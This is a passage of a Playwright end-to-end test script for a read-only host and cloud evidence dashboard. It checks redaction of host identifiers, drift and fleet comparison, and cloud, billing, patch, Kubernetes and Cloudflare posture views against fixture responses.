    check(evidenceRequests===0&&await deniedPage.locator('#collect').isDisabled(), 'Tokenless bootstrap rejects '+(session?.authenticationMode==='proxy'?'an unauthenticated proxy':session?'a local-mode session claim':'an unauthorized local session'));
    await deniedContext.close();
  }
}

async function main() {
  const bootstrap = await startServer(), origin = new URL(bootstrap).origin, token = new URLSearchParams(new URL(bootstrap).hash.slice(1)).get('token');
  browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || (fs.existsSync('/usr/bin/chromium') ? '/usr/bin/chromium' : undefined), headless: true, args: ['--no-sandbox'] });
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 }, acceptDownloads: true });
  const page = await context.newPage(), errors = [], external = []; activePage = page;
  page.on('pageerror', error => { errors.push(error.message); console.error('Browser runtime error: ' + error.message.replace(/#token=\S+/g, '#token=[redacted]')); });
  page.on('request', request => { if (!request.url().startsWith(origin + '/') && !request.url().startsWith('blob:')) external.push(request.url()); });
  await page.goto(bootstrap);
  await page.getByRole('heading', { name: 'Host evidence', exact: true }).waitFor();
  check(page.url() === origin + '/', 'Bootstrap fragment is consumed before any evidence requests');
  await exerciseConnections(page, origin);
  check(!await page.locator('body').innerText().then(text => text.includes('api-private-host')), 'Default evidence view redacts host identifiers');
  check(await page.locator('.safety').innerText().then(text => text.includes('READ ONLY')), 'Read-only banner remains visible');
  await page.keyboard.press('Control+k');
  check(await page.locator('#search').evaluate(node => node === document.activeElement), 'Ctrl+K focuses the global evidence search');
  await page.locator('#search').fill('worker');
  check(await page.locator('#search-results button').count() > 0, 'Global search finds processes, ports, and services from real snapshot records');
  await page.locator('#search-results button').first().click();
  await page.keyboard.press('Escape');
  await page.locator('[data-view="processes"]').click();
  await page.getByRole('heading', { name: 'Listening ports', exact: true }).waitFor();
  check(await page.locator('table').count() === 2, 'Processes and listening ports render as accessible tables');
  await page.locator('[data-view="services"]').click();
  check(await page.locator('td').allTextContents().then(values => values.includes('[redacted-service]')), 'Services show collected service evidence');
  await page.locator('[data-view="findings"]').click();
  await page.locator('#severity-filter').selectOption('critical');
  check(await page.locator('#view').innerText().then(text => text.includes('No findings')), 'Severity filter uses the collected finding severity');
  await page.locator('#severity-filter').selectOption('warning');
  check(await page.getByRole('heading', { name: 'Test evidence', exact: true }).count() === 1, 'Finding evidence and recommendations render after filtering');
  await page.locator('[data-view="overview"]').click();
  await page.locator('#full').check();
  await page.getByText('api-private-host', { exact: true }).waitFor();
  check(await page.locator('#privacy').innerText().then(text => text.includes('Full identifiers visible')), 'Full evidence requires an explicit visible toggle');
  await page.locator('#full').uncheck();
  await page.getByText('[redacted-host]', { exact: true }).waitFor();
  let releaseFullRequest;
  let markContinued;
  const requestContinued = new Promise(resolve => { markContinued = resolve; });
  await page.route('**/api/snapshot?full=true', async route => { await new Promise(resolve => { releaseFullRequest = resolve; }); await route.continue(); markContinued(); });
  await page.locator('#full').check();
  await page.waitForFunction(() => document.getElementById('full').checked);
  for (let count = 0; !releaseFullRequest && count < 50; count++) await new Promise(resolve => setTimeout(resolve, 10));
  check(typeof releaseFullRequest === 'function', 'Full-view response can be delayed for the privacy regression check');
  await page.locator('#full').uncheck();
  releaseFullRequest();
  await requestContinued;
  await page.unroute('**/api/snapshot?full=true');
  await page.waitForTimeout(300);
  check(!await page.locator('body').innerText().then(text => text.includes('api-private-host')), 'A stale full-view response cannot reveal identifiers after redaction is restored');
  await page.locator('#language').selectOption('es');
  check(await page.getByRole('heading', { name: 'Resumen', exact: true }).count() === 1, 'Spanish navigation and evidence labels are available');
  const theme = await page.locator('html').getAttribute('data-theme');
  await page.locator('#theme').click();
  check(await page.locator('html').getAttribute('data-theme') !== theme, 'Light and dark themes switch without network resources');
  await page.locator('#language').selectOption('en');
  await page.locator('[data-view="drift"]').click();
  const compareDrift = page.getByRole('button', { name: 'Compare with current', exact: true });
  check(await compareDrift.isDisabled(), 'Drift comparison is disabled until a baseline is validated');
  await page.locator('#baseline-upload').setInputFiles({ name: 'invalid-baseline.json', mimeType: 'application/json', buffer: Buffer.from('{"host":{},"collectedAtUtc":"bad","findings":[]}') });
  await page.getByRole('status').filter({ hasText: 'The uploaded snapshot is invalid' }).waitFor();
  check(await page.locator('.split-evidence').count() === 0, 'Structurally invalid uploaded JSON is rejected by the shared parser before entering UI state');
  const baseline = await (await context.request.get(origin + '/api/snapshot', { headers: { 'X-Opscope-Token': token } })).json();
  baseline.cpuUsedPercent = 90;
  // EN: Hold completed server responses to verify readiness independently of browser/network timing.
  // ES: Se retienen respuestas del servidor para comprobar el estado sin depender de la velocidad del navegador o la red.
  const pauseResponse = () => {
    let release, entered;
    const held = new Promise(resolve => { entered = resolve; });
    const resumed = new Promise(resolve => { release = resolve; });
    const wait = async () => {
      let timer;
      try {
        await Promise.race([held, new Promise((_, reject) => { timer = setTimeout(() => reject(new Error('Expected drift response was not intercepted.')), 30000); })]);
      } finally { clearTimeout(timer); }
    };
    return { wait, resumed, release, entered };
  };
  const validation = pauseResponse(), comparison = pauseResponse(), lateValidation = pauseResponse();
  const pausedResponses = [validation, comparison, lateValidation];
  let driftRequests = 0;
  const holdDriftResponse = async route => {
    const pause = pausedResponses[driftRequests++], response = await route.fetch();
    if (pause) { pause.entered(); await pause.resumed; }
    await route.fulfill({ response });
  };
  await page.route('**/api/diff', holdDriftResponse);
  try {
    await page.locator('#baseline-upload').setInputFiles({ name: 'baseline.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(baseline)) });
    await validation.wait();
    check(await compareDrift.isDisabled() && await page.locator('.split-evidence').count() === 0, 'A pending baseline validation keeps comparison disabled and evidence unselected');
    const pendingButton = await compareDrift.elementHandle();
    await page.locator('#show-latest').waitFor({ state: 'visible', timeout: 15000 });
    check(await pendingButton.evaluate(button => button.isConnected), 'Live evidence preserves the actual pending comparison control instead of replacing its DOM node');
    await pendingButton.dispose();
    check(await compareDrift.isDisabled() && driftRequests === 1, 'Live SSE rendering preserves pending baseline readiness without starting a comparison');
    validation.release();
    await page.getByRole('status').filter({ hasText: 'Baseline loaded. Compare it with current evidence.' }).waitFor();
    check(await compareDrift.isEnabled(), 'A validated baseline enables explicit comparison');
    await compareDrift.click();
    await comparison.wait();
    check(await compareDrift.isDisabled() && driftRequests === 2, 'An in-flight comparison disables repeated submission');
    comparison.release();
    await page.getByRole('heading', { name: 'Significant changes detected', exact: true }).waitFor();
    check(driftRequests === 2 && await compareDrift.isEnabled(), 'One explicit comparison completes after validation and restores the control');
    check(await page.locator('.split-evidence section').count() === 2, 'Uploaded baseline and current evidence appear side by side');
    check(await page.locator('#view').innerText().then(text => text.includes('cpuUsedPercent') && text.includes('-72.5')), 'Drift uses the shared diff engine metric values');
    await page.locator('#baseline-upload').setInputFiles({ name: 'replacement.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify({ ...baseline, cpuUsedPercent: 55 })) });
    await lateValidation.wait();
    check(await compareDrift.isDisabled() && await page.locator('.split-evidence').count() === 0, 'Choosing a replacement immediately removes the old baseline and comparison');
    await page.locator('#baseline-upload').setInputFiles({ name: 'invalid-replacement.json', mimeType: 'application/json', buffer: Buffer.from('{"host":{},"collectedAtUtc":"bad","findings":[]}') });
    await page.getByRole('status').filter({ hasText: 'The uploaded snapshot is invalid' }).waitFor();
    check(await compareDrift.isDisabled() && await page.locator('.split-evidence').count() === 0, 'An invalid replacement cannot fall back to previously validated evidence');
    const lateResponseFinished = page.waitForEvent('requestfinished', request => request.url() === origin + '/api/diff' && request.postDataJSON()?.cpuUsedPercent === 55);
    lateValidation.release();
    await lateResponseFinished;
    const latestButton = await compareDrift.elementHandle();
    await page.locator('#show-latest').waitFor({ state: 'visible', timeout: 15000 });
    check(await latestButton.evaluate(button => button.isConnected), 'Superseded-baseline feedback remains stable when a newer sample arrives');
    await latestButton.dispose();
    check(await compareDrift.isDisabled() && await page.locator('.split-evidence').count() === 0, 'A late validation response cannot restore a superseded baseline after live rendering');
  } finally {
    pausedResponses.forEach(response => response.release());
    await page.unroute('**/api/diff', holdDriftResponse);
  }
  await page.locator('[data-view="fleet"]').click();
  const fleetFirst = structuredClone(baseline), fleetSecond = structuredClone(baseline);
  fleetFirst.host.hostname = 'browser-fleet-private-a'; fleetFirst.cpuUsedPercent = 10;
  fleetSecond.host.hostname = 'browser-fleet-private-b'; fleetSecond.cpuUsedPercent = 95;
  await page.locator('#fleet-upload').setInputFiles([
    { name: 'oversized.json', mimeType: 'application/json', buffer: Buffer.alloc(2 * 1024 * 1024, ' ') },
    { name: 'peer.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(fleetFirst)) }
  ]);
  check(await page.getByRole('button', { name: 'Compare fleet', exact: true }).isDisabled(), 'Fleet upload enforces its total local file-size bound before comparison');
  await page.locator('#fleet-upload').setInputFiles([
    { name: 'first.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(fleetFirst)) },
    { name: 'second.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(fleetSecond)) }
  ]);
  await page.getByText('2 snapshots selected', { exact: true }).waitFor();
  await page.getByRole('button', { name: 'Compare fleet', exact: true }).click();
  await page.getByRole('heading', { name: 'Observed outliers and peer differences', exact: true }).waitFor();
  check(await page.locator('#view').innerText().then(text => text.includes('52.5%') && text.includes('FLEET_CPU_OUTLIER')), 'Fleet multi-upload shows the actual two-host median and CPU outlier finding');
  check(await page.locator('td').allTextContents().then(values => values.includes('[redacted-host-1]') && values.includes('[redacted-host-2]')), 'Fleet comparison keeps distinct anonymous host rows');
  check(!await page.locator('#view').innerText().then(text => text.includes('browser-fleet-private')), 'Fleet view always redacts uploaded host identities');
  check(await page.locator('#view').innerText().then(text => text.includes('never sent to a cloud service or saved in history')), 'Fleet view states its local-only stateless processing');
  await page.locator('[data-view="history"]').click();
  await page.locator('svg[role="img"]').waitFor({ timeout: 15000 });
  check(await page.locator('svg[role="img"]').count() === 1, 'Retained samples produce an accessible trend chart');
  check(await page.locator('#view').innerText().then(text => text.includes('service-observation') && text.includes('observation time')), 'Timeline distinguishes actual failed-service observations from inferred change times');
  await page.getByRole('button', { name: 'View redacted sample', exact: true }).first().click();
  await page.getByRole('heading', { name: 'Retained redacted evidence', exact: true }).waitFor();
  check(!await page.locator('pre').innerText().then(text => text.includes('api-private-host')), 'Historical evidence remains redacted after full-view use');
  await page.locator('[data-view="cloud"]').click();
  check(await page.locator('#cloud-provider option').count() === 13, 'Cloud selector exposes eleven infrastructure providers, one cluster adapter and its all-provider choice');
  await page.locator('#cloud-provider').selectOption('scaleway');
  check(await page.locator('#view').innerText().then(text => /not configured|not-configured|no configured/i.test(text)) && await page.locator('#view button').filter({ hasText: /scaleway.*inventory/ }).count() === 0, 'Unconfigured Scaleway inventory remains discoverable without advertising an executable empty inventory');
  await page.locator('#cloud-provider').selectOption('all');
  check(await page.getByRole('button', { name: /azure-scope-1\/inventory$/ }).count() === 1 && await page.getByRole('button', { name: /aws-scope-20\/health$/ }).count() === 1, 'Configured anonymous Azure and AWS scope aliases render as query actions');
  async function invokeFixtureCloud(action, expectedCount) {
    let response;
    for (let attempt = 0; attempt < 4; attempt++) {
      const received = page.waitForResponse(result => result.url() === origin + '/api/cloud/' + action);
      await page.getByRole('button').filter({ hasText: action }).click();
      response = await received;
      if (response.status() !== 429) break;
      // The fixture's periodic collector shares the production two-second action cooldown.
      await page.waitForTimeout(2100);
    }
    assert.equal(response.status(), 200, 'Scoped fixture cloud query succeeds after the action cooldown');
    assert.equal((await response.json()).data.resourceCount, expectedCount);
    await page.waitForFunction(expected => {
      try { return JSON.parse(document.querySelector('#view pre')?.textContent || '{}').data?.resourceCount === expected; }
      catch { return false; }
    }, expectedCount);
  }
  await invokeFixtureCloud('azure-scope-1/inventory', 3);
  check(JSON.parse(await page.locator('#view pre').innerText()).data.resourceCount === 3, 'Azure scoped action invokes its exact allowlisted fixture callback');
  check(await page.locator('#notice').isHidden(), 'A new cloud query clears transient notices from earlier evidence workflows');
  await invokeFixtureCloud('aws-scope-20/health', 5);
  check(JSON.parse(await page.locator('#view pre').innerText()).data.resourceCount === 5, 'AWS scoped action invokes its exact allowlisted fixture callback');
  let releaseCloudFailure, markCloudStarted;
  const cloudStarted = new Promise(resolve => { markCloudStarted = resolve; });
  await page.route('**/api/cloud/aws-scope-20/health', async route => {
    await new Promise(resolve => { releaseCloudFailure = resolve; markCloudStarted(); });
    await route.fulfill({ status: 502, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/aws/health', collectedAtUtc: new Date().toISOString(), findings: [], data: null, warnings: ['Fixture cloud coverage unavailable.'], operationSucceeded: false }) });
  });
  const cloudFailure = page.waitForResponse(response => response.url() === origin + '/api/cloud/aws-scope-20/health');
  await page.getByRole('button').filter({ hasText: 'aws-scope-20/health' }).click();
  await cloudStarted; await page.locator('#cloud-status').waitFor();
  const loadingCloudSource = await page.locator('#source-context').textContent().then(text => text.includes('aws-scope-20/health')) && await page.locator('#cloud-status').innerText().then(text => text.includes('Running configured cloud query')) && await page.locator('#view button').evaluateAll(buttons => buttons.every(button => button.disabled));
  releaseCloudFailure(); assert.equal((await cloudFailure).status(), 502); await page.locator('#cloud-error').waitFor();
  check(loadingCloudSource, 'Pending cloud query names its selected scope and disables competing query controls');
  check(JSON.parse(await page.locator('#view pre').innerText()).operationSucceeded === false && !await page.locator('#view pre').innerText().then(text => text.includes('resourceCount')), 'An unsuccessful next cloud query replaces the earlier result with its actual failure and coverage report');
  await page.unroute('**/api/cloud/aws-scope-20/health');
  for (const [provider, expectedValue] of [['gcp', '37.5'], ['hetzner', '67.1']]) {
    await page.locator('#cloud-provider').selectOption(provider);
    const action = provider + '-scope-1/metrics';
    let response;
    for (let attempt = 0; attempt < 4; attempt++) {
      const received = page.waitForResponse(result => result.url() === origin + '/api/cloud/' + action);
      await page.getByRole('button').filter({ hasText: action }).click();
      response = await received;
      if (response.status() !== 429) break;
      await page.waitForTimeout(2100);
    }
    assert.equal(response.status(), 200);
    await page.locator('.ops-cloud-series').waitFor();
    check(await page.locator('.ops-cloud-result-summary>.ops-cloud-status[data-state="complete"]').count() === 1 && await page.locator('.ops-cloud-series svg[role="img"]').count() === 1, provider + ' metrics preserve their complete coverage and expose a provider-specific chart');
    check(await page.locator('.ops-cloud-series').textContent().then(text => text.includes('percent') && text.includes('60 s') && text.includes(expectedValue)), provider + ' metrics preserve their real percentages, sixty-second interval and alternative data table');
    await page.setViewportSize({ width: 390, height: 844 });
    await page.waitForFunction(() => { const text = document.querySelector('.ops-cloud-series svg text'), matrix = text?.getScreenCTM(); return matrix && parseFloat(getComputedStyle(text).fontSize) * Math.hypot(matrix.a, matrix.b) >= 11; });
    check(await page.locator('.ops-cloud-series svg').evaluate(svg => svg.viewBox.baseVal.width <= 390), provider + ' cloud chart retains readable axis labels on mobile');
    await page.setViewportSize({ width: 1440, height: 1000 });
  }
  async function invokeAdvancedFixture(action, kind, expectedStatus = 200) {
    let response;
    for (let attempt = 0; attempt < 4; attempt++) {
      const received = page.waitForResponse(result => result.url() === origin + '/api/cloud/' + action);
      await page.getByRole('button').filter({ hasText: action }).click();
      response = await received;
      if (response.status() !== 429) break;
      await page.waitForTimeout(2100);
    }
    assert.equal(response.status(), expectedStatus, 'Configured advanced observation retains its actual status after the action cooldown');
    await page.locator('#cloud-status').waitFor({ state: 'hidden' });
    await page.waitForFunction(expected => {
      try { return JSON.parse(document.querySelector('#view pre')?.textContent || '{}').kind === expected; }
      catch { return false; }
    }, kind);
  }
  await page.locator('#cloud-provider').selectOption('gcp');
  check(await page.locator('.ops-cloud-card [data-operation="scc"]').count() === 1 && await page.locator('.ops-cloud-card [data-operation="cost"]').count() === 1 && await page.locator('.ops-cloud-card [data-operation="services"]').count() === 1, 'Advanced operation coverage comes from the registered GCP descriptor');
  await invokeAdvancedFixture('gcp-scope-1/scc', 'cloud/gcp/scc');
  check(await page.locator('.ops-scc-evidence').innerText().then(text => text.includes('SYNTHETIC_FINDING') && text.includes('HIGH') && text.includes('ACTIVE') && text.includes('does not establish a secure project')), 'SCC exposes the observed finding state and coverage without certifying project security');
  await invokeAdvancedFixture('gcp-scope-1/cost', 'cloud/gcp/cost');
  check(await page.locator('.ops-billing-evidence').innerText().then(text => text.includes('EUR') && text.includes('USD') && text.includes('10.50') && text.includes('3.00') && text.includes('not a complete bill') && text.includes('Currencies are kept separate')), 'Billing keeps observed cost and credits per currency and states that the rows are not a complete bill');
  const costPath = '**/api/cloud/gcp-scope-1/cost';
  let billingMode = 'tiny';
  await page.route(costPath, route => route.fulfill({ status: billingMode === 'denied' ? 502 : 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/gcp/cost', collectedAtUtc: new Date().toISOString(), findings: [], warnings: ['Synthetic export observation only.'], operationSucceeded: billingMode !== 'denied', data: { coverage: { state: billingMode === 'denied' ? 'PermissionDenied' : 'Partial' }, billing: { source: 'Existing BigQuery export', rowsRead: billingMode === 'empty' ? 0 : 1, matchedRows: billingMode === 'empty' ? 0 : 1, isComplete: false, currencySubtotals: billingMode === 'denied' ? [{ currency: 'USD', observedCost: 123.45, observedCredits: 0, observedNetCost: 123.45, observedRows: 1 }] : billingMode === 'tiny' ? [{ currency: 'USD', observedCost: 0.0000004, observedCredits: 0, observedNetCost: 0.0000004, observedRows: 1 }] : [] } } }) }));
  await invokeAdvancedFixture('gcp-scope-1/cost', 'cloud/gcp/cost');
  check(await page.locator('.ops-billing-evidence tbody tr td').nth(1).innerText().then(text => text === '4E-7'), 'Small nonzero observed billing amounts retain their magnitude instead of rounding to zero');
  billingMode = 'empty';
  await invokeAdvancedFixture('gcp-scope-1/cost', 'cloud/gcp/cost');
  check(await page.locator('.ops-billing-evidence').innerText().then(text => text.includes('Cost is unknown') && !text.includes('0.00')) && await page.locator('.ops-billing-evidence table').count() === 0, 'An export without matching rows leaves monetary evidence unknown instead of showing a zero bill');
  billingMode = 'denied';
  const deniedBilling = page.waitForResponse(response => response.url() === origin + '/api/cloud/gcp-scope-1/cost');
  await page.getByRole('button').filter({ hasText: 'gcp-scope-1/cost' }).click(); await deniedBilling; await page.locator('#cloud-error').waitFor();
  check(await page.locator('.ops-billing-evidence').innerText().then(text => text.includes('Billing evidence is unavailable') && !text.includes('123.45') && !text.includes('No matching billing rows')) && await page.locator('.ops-billing-evidence table').count() === 0, 'Permission-denied billing hides stale subtotals and remains distinct from a successful empty read');
  await page.unroute(costPath);
  check(await page.locator('.ops-cloud-card [data-operation="patches"]').count() === 1 && await page.locator('.ops-cloud-card [data-operation="drift"]').count() === 1 && await page.locator('#view input[type="file"]').count() === 0, 'Patch and baseline operations use configured descriptors without accepting browser baseline files or paths');
  await invokeAdvancedFixture('gcp-scope-1/patches', 'cloud/gcp/patches');
  check(await page.locator('.ops-patch-evidence').innerText().then(text => text.includes('SUCCEEDED') && text.includes('Stale job observation') && text.includes('Unknown — no current compliance assessment') && text.includes('Job success does not prove')), 'A successful stale patch job remains an observation with unknown current compliance');
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Patch observations and their unknown-compliance explanation fit the mobile viewport');
  await page.setViewportSize({ width: 1440, height: 1000 });
  let patchMode = 'empty';
  const patchPath = '**/api/cloud/gcp-scope-1/patches';
  await page.route(patchPath, route => route.fulfill({ status: patchMode === 'denied' ? 502 : 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/gcp/patches', collectedAtUtc: new Date().toISOString(), findings: [], warnings: [], operationSucceeded: patchMode !== 'denied', data: { coverage: { state: patchMode === 'denied' ? 'PermissionDenied' : 'Complete' }, patches: { source: 'osconfig-existing-patch-jobs-v1', jobsRead: patchMode === 'denied' ? 1 : 0, complianceState: 'compliant', latestObservedJobUpdateUtc: null, jobs: patchMode === 'denied' ? [{ state: 'STALE_PRIVATE_JOB', succeededInstanceCount: 999 }] : [] } } }) }));
  await invokeAdvancedFixture('gcp-scope-1/patches', 'cloud/gcp/patches');
  check(await page.locator('.ops-patch-evidence').innerText().then(text => text.includes('No existing patch jobs were observed') && text.includes('Unknown — no current compliance assessment')) && await page.locator('.ops-patch-evidence table').count() === 0, 'An empty patch read and an unsupported compliance flag do not certify patch compliance');
  patchMode = 'denied';
  await invokeAdvancedFixture('gcp-scope-1/patches', 'cloud/gcp/patches', 502);
  check(await page.locator('.ops-patch-evidence').innerText().then(text => text.includes('Patch-job evidence is unavailable') && !text.includes('STALE_PRIVATE_JOB') && !text.includes('999')) && await page.locator('.ops-patch-evidence table').count() === 0, 'Unavailable patch evidence hides stale observations and preserves unknown compliance');
  await page.unroute(patchPath);
  await invokeAdvancedFixture('gcp-scope-1/drift', 'cloud/gcp/drift');
  check(await page.locator('.ops-drift-evidence').innerText().then(text => text.includes('Shared fields compared') && text.includes('Changed') && text.includes('state') && text.includes('not a live infrastructure-as-code plan')), 'Cloud drift exposes its actual inventory comparison and limited shared fields');
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Inventory comparison fields and coverage fit the mobile viewport');
  await page.setViewportSize({ width: 1440, height: 1000 });
  let driftMode = 'partial';
  const driftPath = '**/api/cloud/gcp-scope-1/drift';
  await page.route(driftPath, route => route.fulfill({ status: driftMode === 'failed' ? 502 : 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/gcp/drift', collectedAtUtc: new Date().toISOString(), findings: [], warnings: [], operationSucceeded: driftMode !== 'failed', data: { coverage: { state: driftMode === 'failed' ? 'Failed' : 'Partial' }, drift: { comparedResources: 2, comparedFields: 1, unknownFields: 3, addedResources: 91, missingResources: 92, changedResources: 1, absenceAssessmentAvailable: false, changes: [{ resourceId: 'added-unverified-resource', changeType: 'Added', fields: [] }, { resourceId: 'missing-unverified-resource', changeType: 'Missing', fields: [] }, { resourceId: 'changed-observed-resource', type: 'compute.googleapis.com/Instance', changeType: 'Changed', fields: ['state', 'arbitrary-secret-field'] }] } } }) }));
  await invokeAdvancedFixture('gcp-scope-1/drift', 'cloud/gcp/drift');
  check(await page.locator('.ops-drift-evidence').innerText().then(text => text.includes('incomplete or non-comparable inventory') && text.includes('changed-observed-resource') && !text.includes('added-unverified-resource') && !text.includes('missing-unverified-resource') && !text.includes('arbitrary-secret-field') && !text.includes('91') && !text.includes('92')), 'Incomplete drift coverage suppresses absence claims and whitelists the compared field names');
  driftMode = 'failed';
  await invokeAdvancedFixture('gcp-scope-1/drift', 'cloud/gcp/drift', 502);
  check(await page.locator('.ops-drift-evidence').innerText().then(text => text.includes('Drift is unknown') && !text.includes('changed-observed-resource')) && await page.locator('.ops-drift-evidence table').count() === 0, 'Failed inventory comparisons cannot reuse earlier changed or absent resource observations');
  await page.unroute(driftPath);
  await page.locator('#cloud-provider').selectOption('kubernetes');
  check(await page.locator('.ops-cloud-card[data-provider="kubernetes"] .ops-adapter-kind').textContent() === 'Cluster adapter' && await page.locator('.ops-cloud-card[data-provider="kubernetes"]').innerText().then(text => text.includes('separate from infrastructure accounts')), 'Kubernetes is presented as an explicitly scoped cluster adapter');
  await invokeAdvancedFixture('kubernetes-scope-1/inventory', 'cloud/kubernetes/inventory');
  check(await page.locator('.ops-cluster-evidence').innerText().then(text => text.includes('No infrastructure identity link has been verified') && text.includes('Authorized namespaces')) && await page.locator('.ops-cloud-result-summary table').innerText().then(text => text.includes('Running')), 'Cluster metadata preserves its namespace scope and unverified infrastructure relationship');
  await invokeAdvancedFixture('kubernetes-scope-1/metrics', 'cloud/kubernetes/metrics');
  check(await page.locator('.ops-cloud-series').count() === 2 && await page.locator('.ops-cloud-series .ops-metric-latest').allTextContents().then(values => values.some(value => value.includes('230 millicores')) && values.some(value => value.replace(/,/g, '').includes('33554432 bytes'))) && await page.locator('.ops-cloud-series table').count() === 2 && await page.locator('.ops-cloud-series svg').count() === 0, 'Single Kubernetes observations preserve CPU millicores and memory bytes with accessible tables without inventing a time series');
  await page.locator('#language').selectOption('es');
  check(await page.locator('.ops-cluster-evidence').innerText().then(text => text.includes('No se ha verificado un vínculo') && text.includes('Namespaces autorizados')), 'Cluster identity and scope explanations are available in Spanish');
  await page.locator('#language').selectOption('en');
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Cluster evidence and its unit-specific metric tables fit the mobile viewport');
  await page.screenshot({ path: path.join(results, 'cluster-metrics-mobile.png'), fullPage: true });
  await page.setViewportSize({ width: 1440, height: 1000 });
  let correlationMode = 'verified';
  const correlationPath = '**/api/cloud/kubernetes-scope-1/inventory';
  await page.route(correlationPath, route => route.fulfill({ status: correlationMode === 'denied' ? 502 : 200, contentType: 'application/json', body: JSON.stringify({ kind: 'cloud/kubernetes/inventory', collectedAtUtc: new Date().toISOString(), findings: [], warnings: [], operationSucceeded: correlationMode !== 'denied', data: { coverage: { state: correlationMode === 'denied' ? 'PermissionDenied' : 'Partial' }, cluster: { namespacesQueried: 1, cloudCorrelationVerified: true, relation: 'verified' }, infrastructureCorrelation: { state: correlationMode === 'legacy' ? 'unverified' : 'partial_node_references', nodeReferencesVerified: correlationMode !== 'legacy', clusterIdentityVerified: false, observedNodes: 3, matchedNodes: 1, unmatchedNodes: 2, links: [{ nodeId: '[redacted-node]', provider: 'gcp', resourceId: '[redacted-resource]', state: 'verified_node_reference' }], warnings: [] } } }) }));
  await invokeAdvancedFixture('kubernetes-scope-1/inventory', 'cloud/kubernetes/inventory');
  check(await page.locator('.ops-cluster-evidence').innerText().then(text => text.includes('Node references match the selected infrastructure inventory') && text.includes('Cluster and control-plane identity remain unverified') && text.includes('Unmatched node references')) && await page.locator('.ops-cluster-evidence table tbody tr').count() === 1, 'Verified node references remain separate from unverified cluster identity and unmatched nodes');
  await page.setViewportSize({ width: 390, height: 844 });
  check(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Node-reference links and the unverified cluster explanation fit the mobile viewport');
  await page.screenshot({ path: path.join(results, 'node-references-mobile.png'), fullPage: true });
  await page.setViewportSize({ width: 1440, height: 1000 });
  await page.locator('#language').selectOption('es');
  check(await page.locator('.ops-cluster-evidence').innerText().then(text => text.includes('Referencias de nodos coincidentes') && text.includes('plano de control sigue sin verificar')), 'Spanish correlation explains the same node-reference and cluster-identity distinction');
  await page.locator('#language').selectOption('en');
  correlationMode = 'legacy';
  await invokeAdvancedFixture('kubernetes-scope-1/inventory', 'cloud/kubernetes/inventory');
  check(await page.locator('.ops-cluster-evidence').innerText().then(text => text.includes('No infrastructure identity link has been verified') && !text.includes('Node references match')) && await page.locator('.ops-cluster-evidence table').count() === 0, 'Legacy cluster flags and unverified correlation cannot claim a verified infrastructure relationship');
  correlationMode = 'denied';
  await invokeAdvancedFixture('kubernetes-scope-1/inventory', 'cloud/kubernetes/inventory', 502);
  check(await page.locator('.ops-cluster-evidence').innerText().then(text => text.includes('No infrastructure identity link has been verified') && !text.includes('Node references match')) && await page.locator('.ops-cluster-evidence table').count() === 0, 'Unavailable cluster evidence does not show stale verified node references');
  await page.unroute(correlationPath);
  const configurationField = (checkName, label) => page.locator(`.ops-configuration-check[data-check="${checkName}"] dt`).filter({ hasText: new RegExp('^'+label+'$') }).locator('..').locator('dd');
  await page.locator('#cloud-provider').selectOption('cloudflare');
  await invokeAdvancedFixture('cloudflare-scope-1/posture', 'cloud/cloudflare/posture');
  check(await page.locator('.ops-configuration-evidence').innerText().then(text => text.includes('flexible') && text.includes('1.0') && text.includes('Disabled') && text.includes('do not establish effective reachability')) && await page.locator('details>summary').filter({ hasText: 'Allowed configuration fields' }).count() === 1, 'Cloudflare exposes observed TLS settings and states the limit of configuration evidence');
  let configurationMode = 'partial';
  const configurationPath = '**/api/cloud/cloudflare-scope-1/posture';
  await page.route(configurationPath, route => {
    const time = configurationMode === 'future' ? new Date(Date.now()+86400000).toISOString() : new Date().toISOString();
    const checks = [
      { check: 'tls', state: 'complete', observedAtUtc: time, zoneId: 'PRIVATE_ZONE_ID', observations: { sslMode: configurationMode === 'invalid' ? 'PRIVATE_SSL_MODE' : 'strict', minimumTlsVersion: configurationMode === 'invalid' ? 'PRIVATE_TLS_VERSION' : '1.2', alwaysUseHttps: configurationMode === 'invalid' ? 'off' : null, content: 'PRIVATE_DNS_CONTENT', expression: 'PRIVATE_WAF_EXPRESSION' } },
      { check: 'dns', state: 'complete', observedAtUtc: time, observations: { observedRecords: configurationMode === 'empty' ? 0 : 2, observedProxiedRecords: 0, observedUnproxiedRecords: configurationMode === 'empty' ? 0 : 2, unknownProxyRecords: 0, recordTypes: configurationMode === 'empty' ? [] : [{ type: 'A', count: 2, content: 'PRIVATE_RECORD_ADDRESS' }, { type: 'PRIVATE_DNS_TYPE', count: 5 }] } },
      { check: 'waf', state: 'permission_denied', observedAtUtc: time, observations: { observedRules: 777, observedEnabledRules: 777, expression: 'PRIVATE_RULE_EXPRESSION' } },
      { check: 'routes', state: 'not_requested', observedAtUtc: time, observations: { observedRoutes: 888, pattern: 'PRIVATE_WORKER_PATTERN' } },
      { check: 'PRIVATE_UNKNOWN_CHECK', state: 'complete', observedAtUtc: time, observations: { observedResources: 999 } }
    ];
